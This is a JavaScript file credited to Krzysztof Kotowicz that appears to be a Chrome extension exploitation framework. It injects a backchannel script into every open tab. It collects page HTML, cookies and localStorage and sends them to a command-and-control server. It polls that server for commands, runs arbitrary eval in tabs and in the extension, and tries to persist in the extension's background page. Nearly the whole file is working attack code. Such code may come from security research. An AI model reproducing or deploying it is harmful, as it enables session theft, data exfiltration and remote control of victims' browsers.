/**
 * @author Krzysztof Kotowicz
 *
 */
/*
todo:
 - screenshots
 - html on demand only
*/

function __exploiter() {
    // this script gets executed in backchannel tab context, it's written here only for syntax highlighting & easy editing
    // start script
    var backchannel_script = function(msg) {
        if (msg.cmd == 'log') {
            var x = new XMLHttpRequest();
            x.open('POST', 'http://dev.localhost/exploiter/server.php?ch=xxx', true);
            x.send(JSON.stringify(msg.p));
        } else if (msg.cmd == 'sendstuff') {
            __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML,'cookies':document.cookie, 'localStorage': localStorage}});
        } else if (msg.cmd == 'eval') {
            __p.postMessage({cmd:'recveval', p: eval(msg.p)});
        }
    }
    
    chrome.permissions.contains({
      origins: ['http://*/*']
    }, function(result) {
        console.log(result,this);
        if (result) {
            // extension has permissions for XHR on our C&C domain
            // and set a direct log function
        } else {
            // proxy the requests to C&C through backchannel tab
        }
    });

    // polling for more commands from c&c server - from page for now
    var set_poller_script = function() {
        setInterval(function() {
            //console.log('polling for cmds');
            var x = new XMLHttpRequest();
            x.open('GET', 'http://dev.localhost/exploiter/server.php?ch=xxx-cmd', true);
            x.onreadystatechange = function () {
              if (x.readyState == 4 && x.status == 200) {
                try {
                    //console.log(x.responseText);
                    var cmds = JSON.parse(x.responseText);
                    for (var i = 0; i < cmds.length; i++) {
                        // forward command to extension
                        __p.postMessage(cmds[i]);
                    }
                } catch(e) {}
              }
            };
            x.send(null); 
        }, 2000);
    }
    
    // end script
    
    var nolog = function() {};
    var log = nolog;
    var backchannel;
    var backchannel_id = null;
    var sheeps = {};
    
    var log_to_console = function() {
        log = function() {
            console.log(arguments);
        }
        ready();
    }
    
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        if (changeInfo.status == 'complete') {
            addSheep(tab, backchannel_id);
            report_tabs();
        }
    });
    
    chrome.tabs.onRemoved.addListener(function(tabId, changeInfo) {
        delete sheeps[tabId];
        report_tabs();
    });
        
    var addSheep = function(tab,backchannel_id) {
        sheeps[tab.id] = tab;
                
        if (tab.id === backchannel_id) // script for backchannel will be added in a moment
            return;

        try {
            chrome.tabs.executeScript(tab.id, 
                {'code': '(function(){var __p=chrome.extension.connect({name:"sheepchannel"});__p.onMessage.addListener('+backchannel_script.toString()+');})();'}
            );
        } catch(e) {
            delete sheeps[tab.id];
        }    
    }
    
    
    // setup backchannel port
    chrome.tabs.getSelected(null, function(t) {
        chrome.extension.onConnect.addListener(function(port) {
            if (port.name == 'backchannel') {
                backchannel = port;
                sheeps[port.tab.id].port = port;
            } else if (port.name == 'sheepchannel') {
                sheeps[port.tab.id].port = port;
            }
            
            port.onMessage.addListener(function(msg) {
                switch (msg.cmd) {
                    case 'recvstuff':
                    case 'recveval':
                        log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p});
                        break;
                    case 'eval':
                        if (msg.id) { // eval in sheep
                            log('eval in sheep');
                            postToSheep(msg.id, {p: msg.p, cmd: 'eval'});
                        } else { // eval in extension
                            log({type: 'recveval',result: eval(msg.p)});
                        }
                        break;
                    case 'ping':
                        log({type: 'pong', id: port.tab.id, url: port.tab.url});
                        break;
                    case 'report':
                        report_tabs();
                        report_page_stuff();
                        report_ext();
                        break;
                }
            });
        });
    
        // add backchannel script to all other tabs (sheeps)
        chrome.tabs.query({}, function(t2) {
            for (var i=0; i<t2.length;i++) {
                addSheep(t2[i], t.id);
            }
        });    

        chrome.tabs.executeScript(t.id, 
            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});__p.onMessage.addListener('+backchannel_script.toString()+');('+set_poller_script.toString()+')()})();'}
            ,function() {backchannel_id = t.id; ready() });
    
            
    });
    
    var log_to_backchannel = function() {
        log = function() {
            if (backchannel) {
                backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
            }
        }
    }
    
    log_to_backchannel();
    
    var report_tabs = function() {
        log('reporting tabs');
        chrome.tabs.query({}, function(t) {
            log({type: 'report_tabs','result':t});
        });
    }
    
    var postToSheeps = function(msg) {
        for (var i in sheeps) {
            postToSheep(i,msg);
        }
    }
    
    var postToSheep = function(i,msg) {
        if (sheeps[i].port) {
            log('sending to ' + sheeps[i].url);
                sheeps[i].port.postMessage(msg);
        }
    }
    
    var report_page_stuff = function() {
        log('reporting page infos');
        postToSheeps({'cmd':'sendstuff'});
        
    }
    
    var report_ext = function() {
        log('reporting ext info'); // autopwn
        log({type:'report_ext',result:{'extension': location.href, 'html':document.documentElement.innerHTML,'cookies':document.cookie, 'localStorage': localStorage}});
    }
    
    var ready = function() { // framework ready
        if (window === chrome.extension.getBackgroundPage()) {
            log('persisted in background page :)');
        } else {
            log('no persistence :/');
        }
        log('foothold started');
        report_tabs();
        report_ext();
    }
};

if (chrome.extension.getBackgroundPage()) {// try to persist in background page
    // chrome 18 csp fix - maybe add script to document.body? 
    chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__exploiter.toString()+ ";__exploiter();"]);
} else {
    __exploiter(); // no persistence :(
}
